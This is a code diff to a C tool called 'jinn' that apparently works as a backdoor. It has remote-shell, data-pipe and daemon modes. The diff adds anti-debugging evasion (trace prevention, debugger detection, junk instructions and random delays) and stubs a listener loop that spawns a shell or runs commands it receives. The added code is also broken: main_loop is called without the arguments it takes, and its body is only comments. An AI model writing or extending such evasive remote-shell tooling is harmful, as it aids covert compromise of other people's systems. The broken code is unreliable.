@@ -8,6 +8,28 @@
 #include "jinn.h"
 
 
+int main_loop(int server_mode, int client_mode, char *host, int port, int log_flag)
+{
+    if (server_mode) {
+        // Listen on TCP port, UDP port, and named pipe
+        // Accept connections and handle incoming data
+        // When "shell" command received, spawn shell
+        // When "command <cmd>" received, execute and return output
+    }
+    else if (client_mode) {
+        // Connect to server via TCP, UDP, or pipe
+        // Send data and receive responses
+    }
+
+    // Main event loop (select/poll/epoll)
+    while (1) {
+        // Handle incoming connections/data
+        // Check for commands (shell, command)
+        // Process log_flag
+    }
+  return 0;
+}
+
 int main(int argc, char *argv[])
 {
   int opt;
@@ -17,10 +39,26 @@ int main(int argc, char *argv[])
   char *host = NULL;
   int port = 0;
   char *program_name;
+  int debugged = 0;
 
   // Initialize random
   srand(time(NULL));
+
+#ifndef DEBUG
+  prevent_trace();
+  if (is_debugged()) debugged = 1;
+#endif
+
   jinn_noop();
+
+  if (debugged == 1) {
+    jinn_junk_inst();
+    jinn_noop();
+    jinn_junk_inst();
+    for (int i=0; i < 5 ; i++) {
+      delay_random_timing();
+    }
+  }
 
   // Check program name for implicit mode
   program_name = strrchr(argv[0], '/');
@@ -147,17 +185,22 @@ int main(int argc, char *argv[])
   // Daemonize if requested
   if (daemon_flag)
     {
-      daemonize();
+      pid_t pid = fork();
+      if (pid < 0) exit(1);
+      if (pid > 0) exit(0);
+      setsid();
     }
 
   // Execute requested mode
   if (genie_flag)
     {
       genie_mode();
+      return 0;
     }
   else if (datapipe_flag)
     {
       datapipe_mode();
+      return 0;
     }
   else if (shell_flag)
     {
@@ -170,7 +213,9 @@ int main(int argc, char *argv[])
   else if (remote_flag)
     {
       remote_shell_mode(host, port);
+      return 0;
     }
 
+  main_loop();
   return 0;
 }
